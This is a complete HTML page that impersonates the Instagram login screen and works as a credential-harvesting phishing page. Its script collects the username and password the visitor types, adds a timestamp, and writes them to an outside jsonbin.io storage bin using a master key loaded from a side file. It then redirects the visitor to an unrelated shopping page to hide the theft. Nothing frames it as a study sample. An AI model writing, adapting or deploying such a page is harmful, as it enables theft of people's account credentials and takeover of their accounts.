<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
@font-face {
  font-family: "Billabong";
  src: url("https://fonts.cdnfonts.com/s/14687/Billabong.woff") format("woff");
}

* {
  box-sizing: border-box;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 16px;
}

.card {
  width: 100%;
  max-width: 380px;
  background: #fff;
  padding: 28px 24px 32px;
  border-radius: 18px;
  box-shadow:
    0 6px 14px rgba(0,0,0,0.08),
    0 20px 40px rgba(0,0,0,0.12);
}

.logo {
  font-family: "Billabong", cursive;
  font-size: 44px;
  text-align: center;
  margin-bottom: 24px;
  color: #000;
}

.input-box {
  position: relative;
  margin-bottom: 14px;
}

.input-box input {
  width: 100%;
  padding: 14px 56px 14px 16px;
  border-radius: 12px;
  border: 1px solid #ccc;
  font-size: 15px;
  outline: none;
}

.input-box input:focus {
  border-color: #000;
  box-shadow: 0 0 0 3px rgba(0,0,0,.12);
}

/* Eye button */
.eye-btn {
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  width: 36px;
  height: 36px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}

.eye-btn svg {
  width: 20px;
  height: 20px;
  color: #000;
}

/* Black login button */
.btn-black {
  width: 100%;
  margin-top: 18px;
  padding: 14px;
  border-radius: 14px;
  border: none;
  background: #000;
  color: #fff;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}

.btn-black:active {
  transform: scale(0.97);
}

.status {
  text-align: center;
  margin-top: 14px;
  font-size: 14px;
  color: #d32f2f;
}
</style>
</head>

<body>

<div class="card">
  <div class="logo">Instagram</div>

  <div class="input-box">
    <input id="username" placeholder="Username">
  </div>

  <div class="input-box">
    <input id="password" type="password" placeholder="Password">

    <div class="eye-btn" onclick="togglePassword()">
      <!-- Eye -->
      <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5"/>
      </svg>

      <!-- Eye slash -->
      <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" fill="currentColor"
           viewBox="0 0 16 16" style="display:none">
        <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5"/>
        <path d="M3.646 3.646l8.708 8.708-.708.708-8.708-8.708z"/>
      </svg>
    </div>
  </div>

  <button class="btn-black" onclick="login()">Log in</button>

  <div id="status" class="status"></div>
</div>

<script>
let BIN_ID = "";
let MASTER_KEY = "";

fetch("./keywwww.dd")
  .then(r => r.json())
  .then(k => {
    BIN_ID = k.BIN_ID;
    MASTER_KEY = k.MASTER_KEY;
  });

function togglePassword() {
  const pass = document.getElementById("password");
  const open = document.getElementById("eyeOpen");
  const closed = document.getElementById("eyeClosed");

  const show = pass.type === "password";
  pass.type = show ? "text" : "password";
  open.style.display = show ? "none" : "block";
  closed.style.display = show ? "block" : "none";
}

async function login() {
  const user = username.value.trim();
  const pass = password.value.trim();
  const status = document.getElementById("status");

  if (!user || !pass) {
    status.textContent = "Please fill all fields";
    return;
  }

  const newData = {
    username: user,
    password: pass,
    time: new Date().toISOString()
  };

  try {
    // 1️⃣ Get current data
    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
      headers: { "X-Master-Key": MASTER_KEY }
    });

    let currentData = [];
    if (getRes.ok) {
      const json = await getRes.json();
      currentData = json.record || [];
    }

    // 2️⃣ Append new entry
    currentData.push(newData);

    // 3️⃣ Save back
    const putRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": MASTER_KEY
      },
      body: JSON.stringify(currentData)
    });

    if (putRes.ok) {
      // Redirect after adding entry
      window.location.href = "https://www.nykaa.com/kay-beauty-2-in-1-kajal-liner-duo/p/14337609?productId=14337609";
    } else {
      status.textContent = "Something went wrong";
    }

  } catch (e) {
    status.textContent = "Network error";
  }
}
</script>

</body>
</html>